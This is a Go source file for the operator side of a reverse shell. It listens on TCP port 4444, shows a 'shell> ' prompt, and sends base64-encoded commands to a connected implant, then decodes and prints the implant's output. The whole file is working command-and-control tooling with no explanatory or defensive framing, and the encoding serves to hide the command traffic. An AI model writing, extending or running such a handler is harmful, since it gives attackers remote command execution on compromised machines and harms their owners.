package main

import (
        "bufio"
        "encoding/base64"
        "flag"
        "fmt"
        "log"
        "net"
        "os"
        "strings"
)

func main() {
        port := flag.String("port", "4444", "Port to listen on")
        flag.Parse()
        serv, err := net.Listen("tcp", ":"+*port)
        if err != nil {
                log.Fatal(err)
        }
        defer serv.Close()
        fmt.Println("Listening on port:", *port)
        conn, err := serv.Accept()
        if err != nil {
                fmt.Println("Error: ", err)
        }
        defer conn.Close()
        prompt := "shell> "
        for {
                fmt.Printf("%s", prompt)
                reader := bufio.NewReader(os.Stdin)
                input, _ := reader.ReadString('\n')
                input = strings.Replace(input, "\n", "", -1)
                enc_input := encode(input)
                if input == "" {
                        continue
                } else if input == "exit" {
                        //conn.Write([]byte("exit\n"))
                        conn.Write([]byte(enc_input + "\n"))
                        os.Exit(0)
                }
                //conn.Write([]byte(input + "\n"))
                conn.Write([]byte(enc_input + "\n"))
                recv(conn)
                println("")
        }
}

func recv(conn net.Conn) {
        reply := make([]byte, 1024)
        length, err := conn.Read(reply)
        if err != nil {
                println(err)
                os.Exit(1)
        }
        dec_mss, _ := base64.StdEncoding.DecodeString(string(reply))
        fmt.Print(string(dec_mss))
        //fmt.Println(string(reply))
        if length == 1024 {
                recv(conn)
        }
}

func encode(str string) string {
        return base64.StdEncoding.EncodeToString([]byte(str))
}
